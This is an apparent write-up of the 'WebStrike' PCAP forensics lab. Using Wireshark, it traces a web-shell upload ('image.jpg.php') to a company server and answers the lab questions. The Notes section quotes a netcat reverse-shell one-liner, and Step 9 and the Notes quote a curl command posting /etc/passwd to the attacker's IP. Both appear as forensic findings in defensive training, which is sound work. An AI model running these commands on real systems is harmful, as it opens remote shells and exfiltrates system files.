# WebStrike Lab
A suspicious file was identified on a company web server, raising alarms within the intranet. The Development team flagged the anomaly, suspecting potential malicious activity. To address the issue, the network team captured critical network traffic and prepared a PCAP file for review.

## Objective:
Task is to analyze the provided PCAP file to uncover how the file appeared and determine the extent of any unauthorized activity.

### Skills Learned
1. Identifying the geographical origin of the attack facilitates the implementation of geo-blocking measures and the analysis of threat intelligence. From which city did the attack originate?
2. Knowing the attacker's User-Agent assists in creating robust filtering rules. What's the attacker's Full User-Agent?
3. We need to determine if any vulnerabilities were exploited. What is the name of the malicious web shell that was successfully uploaded?
4. Identifying the directory where uploaded files are stored is crucial for locating the vulnerable page and removing any malicious files. Which directory is used by the website to store the uploaded files?
5. Which port, opened on the attacker's machine, was targeted by the malicious web shell for establishing unauthorized outbound communication?
6. Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate?

### Tools Used
- Wireshark
- ipgeolocation.io

## Steps:
| Steps  | Descrition | Reference Photo |
|--------|------------|-----------------|
| Step 1 | Navigate to the WebStrike.PCAP file that was captured | *Ref 1: WebStrike.PCAP file |
| Step 2 | Perform an IPv4 Address Lookup of (117.11.88.124) | *Ref 2: Bad Actor 117.11.88.124 |
| Step 3 | Identify the User-Agent "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" | *Ref 3: User-Agent |
| Step 4 | Create a filter for Wireshark (ip.src == 117.11.88.124 and http.request.method=="POST") | *Ref 4: Filter |
| Step 5 | Identify any successful uploads "image.jpg.php" uploaded successfully | *Ref 5: "image.jpg.php" |
| Step 6 | Locate the file location of the uploaded file /reviews/uploads/ | *Ref 6: Uploaded file Directory |
| Step 7 | Identify the targeted Port used for infiltration Port 8080 | *Ref 7: Port Access 8080 |
| Step 8 | Create a filter for Wireshark (tcp.port==8080) && (ip.src==24.49.63.79) | *Ref 8: Filter #2 |
| Step 9 | Identify the commands used for exfiltration "curl" "curl -X POST -d /etc/passwd 117.11.88.124:443" | *Ref 9: Exfiltration Command |
| Step 10 | Identified the critical information containing sensitive user configuration data | *Ref 10: Directory Accessed |

*Ref 1: WebStrike.PCAP file
- <img width="1910" height="859" alt="Screenshot 2025-08-08 at 11 44 06 PM" src="https://github.com/user-attachments/assets/736979ff-fbf5-48af-9bb9-3369e9200c2a" />

*Ref 2: Bad Actor 117.11.88.124
- <img width="855" height="752" alt="Screenshot 2025-08-08 at 11 56 04 PM" src="https://github.com/user-attachments/assets/4a183159-2ef0-435d-bda9-a59d2a2887fe" />

*Ref 3: User-Agent 
- <img width="1856" height="893" alt="image" src="https://github.com/user-attachments/assets/cdf7db99-5c91-4fbd-ba6b-46f5dc4c4aac" />

*Ref 4: Filter #1
- <img width="1849" height="831" alt="Screenshot 2025-08-09 at 12 08 05 AM" src="https://github.com/user-attachments/assets/f79ec809-494d-4811-825b-18b22520b465" />

*Ref 5: "image.jpg.php"
- <img width="1821" height="865" alt="image" src="https://github.com/user-attachments/assets/94f779a2-3a1e-4d1c-885b-1a1bdc3105f9" />

*Ref 6: Uploaded file Directory
- <img width="1595" height="759" alt="image" src="https://github.com/user-attachments/assets/8992d4d3-b9f1-4cc4-9f26-5628b177ef9a" />

*Ref 7: Port Access 8080
- <img width="638" height="613" alt="image" src="https://github.com/user-attachments/assets/57eba6f9-1aa0-4615-a896-9392ea213d61" />

*Ref 8: Filter #2
- <img width="829" height="770" alt="image" src="https://github.com/user-attachments/assets/2abd75b1-d5d4-4b68-8614-ccc5aa09d194" />

*Ref 9: Exfiltration Command
- <img width="627" height="612" alt="image" src="https://github.com/user-attachments/assets/6af79db0-6335-4beb-880f-74e91d9acb83" />

*Ref 10: Directory Accessed
- <img width="621" height="616" alt="image" src="https://github.com/user-attachments/assets/c451d09b-1d52-4e08-9b0c-82688c452727" />


## Notes:
- Thunar file system interaction
- https://ipgeolocation.io/   for IPv4v Address (117.11.88.124) Lookup
- WebStrike.PCAP
- uese-agent ---- | Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 |
- Filter for wire shark ---- |(ip.src == 117.11.88.124 and http.request.method=="POST") |
- "image.jpg.php" uploaded successfully
- ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f")
- Uploaded file found in /reviews/uploads/
- Port 8080 targeted
- Filter for wire shark ---- | (tcp.port==8080) && (ip.src==24.49.63.79) |
- Attacker used "curl" "curl -X POST -d /etc/passwd 117.11.88.124:443/"
- Shows exfiltration of critical information containing sensitive user configuration data.
